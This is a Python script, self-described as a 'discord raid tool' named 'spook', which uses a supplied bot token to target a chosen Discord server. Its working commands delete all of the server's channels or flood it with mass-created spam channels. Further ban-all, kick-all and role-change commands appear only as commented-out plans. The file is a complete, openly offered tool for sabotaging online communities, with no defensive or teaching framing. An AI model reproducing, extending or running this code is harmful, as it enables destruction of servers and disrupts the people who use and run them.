import colorama, os
import asyncio, discord
import random
import re

from colorama import *

colorama.init()

def banner():
	_banner = r'''{1}
                       _    
 ___ _ __   ___   ___ | | __
/ __| '_ \ / _ \ / _ \| |/ /
\__ \ |_) | (_) | (_) |   < 
|___/ .__/ \___/ \___/|_|\_\
    |_| {0}by badaboum#6183{1}
	'''.format(Fore.CYAN, Fore.WHITE).split('\n')

	for line in _banner:
		print(' ' * (round(os.get_terminal_size().columns / 2) - 14) + line)
	
	print('version 1.0.0')
	print('shit discord raid tool i devlopped in a night (more will be added soon)\n')

def success(message):
	print('{0}[+]{1} {2}'.format(Fore.GREEN, Fore.WHITE, message))

def fail(message):
	print('{0}[-]{1} {2}'.format(Fore.RED, Fore.WHITE, message))

def clear():
	print('\033[2J\033[H')
	banner()

clear()

print('{0}the token won\'t be hidden !'.format(Fore.YELLOW))
print('{1}enter the {0}bot{1} token → '.format(Fore.RED, Fore.WHITE), end='') #fix some colorama error
token = input()

client = discord.Client()

@client.event
async def on_ready():
	clear()
	success('logged in as {4}"{3}{0}{5}#{3}{1}{4}" ({3}{2}{4})\n\n'.format(client.user.name, client.user.discriminator, client.user.id, Fore.CYAN, Fore.WHITE, Fore.BLUE))

	servers = {}
	targeted = False

	for guild in client.guilds:
		try:
			servers[str(guild.id)] = guild
		except:
			pass


	while 1:
		try:
			print('{0}$p00k {1}→ {2}'.format(Fore.CYAN, Fore.BLUE, Fore.WHITE), end='')
			complete_input = input()

			args = complete_input.split()
			command = args[0].lower()

			if command == 'help':
				
				emotes = {'..': '0', 'oo': '-', '@@': 'O', '66': '^', ' "': '~'}
				eyes = random.choice(['..', 'oo', '@@', '66', ' "'])
				mouth = emotes[eyes]
				
				ghost = '   ___      \n _/ {0}\\   * \n( \\  {1}/__/  \n \\    \\__)  \n /     \\    \n/      _\\   \n`"""""``    '.format(eyes, mouth).split('\n') # some cute ghost 8w8
				help = ''
				x = 0

				commands = {
					'show servers': 'show server list',
					'use <server id>': 'set target server',
					'delete-channels': 'delete all channels',
					#'delete-roles': 'delete all roles',
					#'set-role <username>#<tag> <role id>': 'set user role',
					'create-channels "<channel name>" <number to create>': 'create channels',
					#'ban-all': 'ban all users',
					#'kick-all': 'kick all users',
					#'server-infos': 'get server infos',
					'clear': 'clear the terminal',
					'credits': 'show credits',
				}

				for command, description in commands.items():
					try:			
						line = ghost[x]
						command = command.replace('"', Fore.RED + '"' + Fore.WHITE)
						help += '{0}{4} {1}→{0} {2} {1}({3})\n'.format(Fore.WHITE, Fore.CYAN, command, description, line)
						x += 1
					except:
						help += ' ' * len('`"""""``    ') + ' {1}→{0} {2} {1}({3})\n'.format(Fore.WHITE, Fore.CYAN, command, description)
				print(help)

			elif command == 'clear':
				clear()

			elif command == 'show':
				try:
					show_what = args[1] # if i want add show users or something
					if show_what == 'servers':
						if servers == {}:
							fail('bot isn\'t even in one server ;(')
						else:
							for guild in client.guilds:
								try:
									print('{3}id: {4}{0} {3}name: {4}{1} {3}members: {4}{2}'.format(guild.id, guild.name, guild.member_count, Fore.WHITE, Fore.CYAN))
								except:
									pass
				except IndexError:
					fail('you forgot one of requiered argument: show servers')

			elif command == 'use':
				try:
					id = args[1]
					try:
						target = servers[id]
						targeted = True
						success('target set to {1}{0}'.format(target.name, Fore.CYAN))
					except (ValueError, KeyError):
						fail('you provided an invalid server id (→ get server(s) id(s) with \'show servers\')')

				except IndexError:
					fail('you forgot one of requiered argument: use <server id> (→ get server(s) id(s) with \'show servers\')')

			elif command == 'create-channels':
				if targeted == True:
					try:
						channel_name = complete_input.split('"')[1].lower().replace(' ', '-')
						number = int(re.findall(r'create-channels ".*?" (\d+)', complete_input)[0]) # ik this is ugly D:
	
						for x in range(number + 1):
							try:
								await target.create_text_channel(channel_name)
								success('created one channel. ({0}/{1})'.format(str(x), str(number)))
							except:
								fail('failed to create one channel.')
	
					except (IndexError, TypeError):
						fail('you forgot one of requiered argument: create-channels \"<channel name>\" <number to create>')
				else:
					fail('please set a target first (→ \'use <server id>\')')

			elif command == 'delete-channels':
				if targeted == True:
					n = len(target.channels)
					d = 0
					for channel in target.channels:
						try:
							await channel.delete()
							d += 1
							success('deleted one channel. ({0}/{1})'.format(str(d), str(n)))
						except:
							fail('failed to delete one channel.')
				else:
					fail('please set a target first (→ \'use <server id>\')')

		except IndexError:
			pass
		except KeyboardInterrupt:
			exit()

try:
	client.run(token)
except KeyboardInterrupt:
	exit()